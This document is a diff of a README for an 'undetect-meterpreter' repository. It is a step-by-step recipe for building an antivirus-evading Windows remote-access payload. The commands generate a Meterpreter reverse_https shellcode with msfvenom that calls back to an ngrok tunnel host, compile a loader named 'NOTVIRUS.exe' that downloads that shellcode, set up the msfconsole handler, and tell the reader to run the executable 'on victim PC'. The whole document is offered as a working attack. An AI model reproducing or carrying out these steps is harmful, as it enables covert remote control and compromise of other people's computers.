@@ -12,6 +12,7 @@ REQUIRMENTS:
 
 1. Donwload repository 
 git clone https://github.com/CsgoBotTG/undetect-meterpreter.git
+cd undetect-meterpreter
 2. Create 3 servers (tcp 9999, python -m http.server, http 8000)
 3. Create ssl
 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
@@ -21,8 +22,8 @@ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
 cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
 rm -f www.example.com.key  www.example.com.crt
 4. Create bincode
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=5.tcp.eu.ngrok.io lport=15754 HandlerSSLCert=/home/kali/meterpreter_undetect_without_compiler/www.example.com.pem StagerVerifySSLCert=true -f raw > bincode.bin
-5. Configure src/main.cpp
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=NGROK_TCP_IP lport=NGROK_TCP_PORT HandlerSSLCert=ABSOLUTE_PATH_TO_THIS_DIR/www.example.com.pem StagerVerifySSLCert=true -f raw > bincode.bin
+5. Configure src/main.cpp (in int main() change const char* url = "YOUR_HTTP_IP/bincode.bin")
 6. Compile exe
 x86_64-w64-mingw32-g++ -o NOTVIRUS.exe src/*.cpp -static -static-libgcc -static-libstdc++ -lwininet -mwindows
 7. Start msfconsole
@@ -34,3 +35,4 @@ set lport 9999
 set HandlerSSLCert /home/kali/meterpreter_undetected_without_compiler/www.example.com.pem
 set StagerVerifySSLCert true
 run
+8. start NOTVIRUS.exe on victim PC
